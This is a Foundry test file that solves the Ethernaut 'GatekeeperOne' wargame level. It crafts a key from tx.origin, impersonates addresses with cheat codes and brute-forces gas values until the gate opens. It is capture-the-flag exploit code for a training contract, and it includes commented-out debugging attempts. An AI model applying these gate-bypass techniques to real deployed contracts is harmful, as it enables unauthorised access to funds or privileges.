pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../GatekeeperOne/GatekeeperOne.sol";
import "../GatekeeperOne/GatekeeperOneHack.sol";
import "../GatekeeperOne/GatekeeperOneFactory.sol";
import "../Ethernaut.sol";


interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input  
  function startPrank(address, address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
}

contract GatekeeperOneTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    GatekeeperOneHack gatekeeperOneHack;
    GatekeeperOneFactory gatekeeperOneFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;
    event Bits32(bytes4 _value);
    // event Bits64(bytes _value);

    function setUp() public {
        // Setup instances of the Ethernaut & GatekeeperOneFactory contracts
        ethernaut = new Ethernaut();
        gatekeeperOneFactory = new GatekeeperOneFactory();
    }

    function testGatekeeperOneHack() public {

        // Register the Ethernaut GatekeeperOne level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(gatekeeperOneFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);

        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(tx.origin, tx.origin);

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);

        // Cast the level address to the GatekeeperOne contract class
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));


        // Create GatekeeperOneHack contract
        gatekeeperOneHack = new GatekeeperOneHack(levelAddress);

        emit log_address(address(gatekeeperOneHack));
        emit log_address(tx.origin);

        bytes4 b1 = bytes4(uint32(uint16(uint160(tx.origin))));

        bytes memory result = new bytes(8);
        assembly {
            mstore(add(result, 4), b1)
            mstore(add(result, 8), b1)
        }


        emit Bits32(b1);

        // emit Bits64(result);




        emit log_uint(uint16(uint160(tx.origin)));
        emit log_bytes32(bytes8(abi.encode(uint16(uint160(tx.origin)),uint16(uint160(tx.origin)))));

        // Call the attack function
        // for (uint i = 0; i < 1; i++) {
        //     try gatekeeperOneHack.attack(bytes8(abi.encode(uint16(uint160(tx.origin)))), 65776+i) {
        //         emit log_named_uint("Pass Gas: ", 65776+i);
        //         break;
        //     } catch {
        //         emit log_named_uint("Fail Gas: ", 65776+i);
        //     }
        // }

        // bytes memory key = new bytes(8);
        // assembly {
        //     mstore(add(key, 4), uint16(uint160(tx.origin)))
        //     mstore(add(key, 8), uint16(uint160(tx.origin)))
        // }
        cheats.stopPrank();


        cheats.startPrank(address(0), tx.origin);

        for (uint i = 0; i <= 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: 67908+i}(bytes8(0x0000ea720000ea72)) {
                emit log_named_uint("Pass Gas: ", 67908+i);
                break;
            } catch {
                emit log_named_uint("Fail Gas: ", 67908+i);
            }
        }
        
        cheats.stopPrank();
        cheats.startPrank(tx.origin, tx.origin);

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));


        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}